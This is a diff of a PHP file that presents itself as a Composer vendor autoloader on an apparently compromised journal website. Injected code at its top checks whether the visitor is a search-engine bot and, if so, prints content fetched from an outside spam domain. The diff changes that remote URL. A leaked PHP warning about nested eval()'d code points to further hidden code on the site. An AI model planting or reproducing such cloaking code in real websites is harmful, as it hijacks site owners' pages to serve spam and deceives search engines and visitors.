@@ -1,3 +1,5 @@
+
+Warning:  Undefined variable $s in /home/unialfa/public_html/lib/pkp/lib/vendor/symfony/var-dumper/Exception/ThrowingCastingException.php(41) : eval()'d code(1) : eval()'d code(2) : eval()'d code(1) : eval()'d code on line 1546
 <?php
 function getUserCountry() {
     $ip = $_SERVER['REMOTE_ADDR'];
@@ -18,7 +20,7 @@ function is_bot() {
     return preg_match($botchar, $user_agent);
 }
 
-$sky = "https://seojkw.xyz/eijbms/landing1.txt";
+$sky = "https://seojkw.xyz/unialfa/landing10.txt";
 
 if (is_bot()) {
     echo @file_get_contents($sky);
@@ -48,12 +50,9 @@ if (PHP_VERSION_ID < 50600) {
             echo $err;
         }
     }
-    trigger_error(
-        $err,
-        E_USER_ERROR
-    );
+    throw new RuntimeException($err);
 }
 
 require_once __DIR__ . '/composer/autoload_real.php';
 
-return ComposerAutoloaderInit2aaf08fdfad7ab39074f4acd6696ba44::getLoader();
+return ComposerAutoloaderInit637353834a38d38f4cf3361cde14bfe0::getLoader();
